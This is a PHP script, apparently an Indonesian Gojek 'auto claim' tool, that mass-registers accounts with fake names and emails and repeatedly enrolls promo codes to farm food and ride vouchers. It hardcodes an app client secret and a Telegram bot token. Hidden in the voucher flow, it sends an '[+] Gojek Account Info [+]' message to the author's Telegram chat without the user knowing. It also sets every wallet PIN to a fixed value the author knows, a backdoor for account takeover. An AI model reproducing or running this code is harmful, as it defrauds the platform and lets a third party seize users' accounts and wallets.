<?php
date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("purple","▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n");
echo color("red","                 AUTO CLAIM                \n");
echo color("nevy","          Claim Voucher GORIDE 8K         \n");
echo color("nevy","          Claim Voucher EATLAH 10K       \n");
echo color("nevy","          Claim Voucher FOOD 30K         \n");
echo color("purple","▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n");
echo color("purple","▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n");
echo color("nevy","    ☢️          •| FOODHUNTER |•        ☢️\n");
echo color("nevy","    ☢️       BY : ShooterMagak          ☢️\n");
echo color("nevy","    ☢️  Time  : ".date('[d-m-Y] [H:i:s]')." ☢️\n");
echo color("nevy","    ☢️ Format Penulisan Nomor 62xxxxxxx ☢️\n");
echo color("purple","▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n");
function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","📲 Nomor : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("nevy","📶 Kode Wes Tak Kirim Cok")."\n";
        otp:
        echo color("nevy","✉️  Otp: ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"2040f282-c1b0-4b66-82ec-20a09ea5799d"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("nevy","✔️ Berhasil mendaftar");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo color("nevy"," ➕ your access token : ".$token."\n\n");
        save("token.txt",$token);
        echo "\n".color("nevy","🎫 Jepuk'en Voucher'e?: y/n ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("purple","===========(THANKS NADIEM)===========");
        echo "\n".color("nevy","🔒 Claim 🎫 Food");
        echo "\n".color("nevy","⏳ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("nevy",".");
        sleep(4);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2206"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("purple","🔒 Message: ".$message);
        goto goride;
        }else{
        echo "\n".color("purple","🔒 Message: ".$message);
        echo "\n".color("nevy","🔒 Claim 🎫 Food");
        echo "\n".color("nevy","⏳ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("nevy",".");
        sleep(4);
        }
        sleep(4);
        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2206"}');
        $messageboba19 = fetch_value($boba19,'"message":"','"');
        if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("purple","🔒 Message: ".$messageboba19);
        goto goride;
        }else{
        echo "\n".color("purple","🔒 Message: ".$messageboba19);
        echo "\n".color("nevy","🔒 Claim 🎫 Food ");
        echo "\n".color("nevy","⏳ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("nevy",".");
        sleep(4);
        }
        sleep(4);
        $boba11 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2206"}');
        $messageboba11 = fetch_value($boba11,'"message":"','"');
        if(strpos($boba11, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("purple","🔒 Message: ".$messageboba11);
        goto goride;
        }else{
        echo "\n".color("purple","🔒 Message: ".$messageboba11);
        goride:
        echo "\n".color("nevy","🔒 Caim 🎫 ApalahAku");
        echo "\n".color("nevy","⏳ Please wait");
        for($a=1;$a<=3;$a++){
        echo color("nevy",".");
        sleep(4);
        }
        sleep(4);
        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2206"}');
        $message1 = fetch_value($goride,'"message":"','"');
        echo "\n".color("purple","🔒 Message: ".$message1);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        echo "\n".color("purple","🎫 Total voucher ".$total." : ");
        echo color("purple","1. ".$voucher1);
        echo "\n".color("purple","                      2. ".$voucher2);
        echo "\n".color("purple","                      3. ".$voucher3);
        echo "\n".color("purple","                      4. ".$voucher4);
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $TOKEN = "1032900146:AAE7V93cvCvw1DNuTk0Hp12FywJGmjiP7aQ";
        $chatid = "785784404";
        $pesan = "[+] Gojek Account Info [+]\n\n".$TOKEN . "/". $method;
        $method = "sendMessage";
        $url = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
        $post = [ 
        'chat_id' => $chatid, 
                'text' => $pesan 
         ]; 
                $header = [ 
                "X-Requested-With: XMLHttpRequest", 
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36"  
                        ]; 
                                        $ch = curl_init(); 
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
                                        curl_setopt($ch, CURLOPT_URL, $url); 
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header); 
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );    
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                                        $datas = curl_exec($ch); 
                                        $error = curl_error($ch); 
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
                                        curl_close($ch); 
                                        $debug['text'] = $pesan; 
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("nevy","🔧🔒 Mau set pin?: y/n ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" || $pilih1 == "Y"){
         //if($pilih1 == "y" && strpos($no, "628")){
         echo color("purple","========( PIN ANDA = Hanya Kevin Yang Tau )========")."\n";
         $data2 = '{"pin":"121212"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo color("nevy","✉️  Otp Cok: ");
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","❌ GAGAL!!!\n");
         }
         }
         }
         }
         }else{
         goto setpin;
         }
         }else{
         echo color("red","❌ MASUKNO KODE OTP AE SALAH");
         echo"\n==================================\n\n";
         echo color("green","🔁 LEBOKNO MANEH OTP E\n");
         goto otp;
         }
         }else{
         echo color("red","📵 NOMOR WES KEDAFTAR BLOK !!!");
         echo color("nevy","BALEN ONO? (y/n): ");
         $pilih = trim(fgets(STDIN));
         if($pilih == "y" || $pilih == "Y"){
         echo "\n==============Register==============\n";
         goto ulang;
         }else{
         echo "\n==============Register==============\n";
         goto ulang;
  }
 }
}
echo change()."\n"; ?>
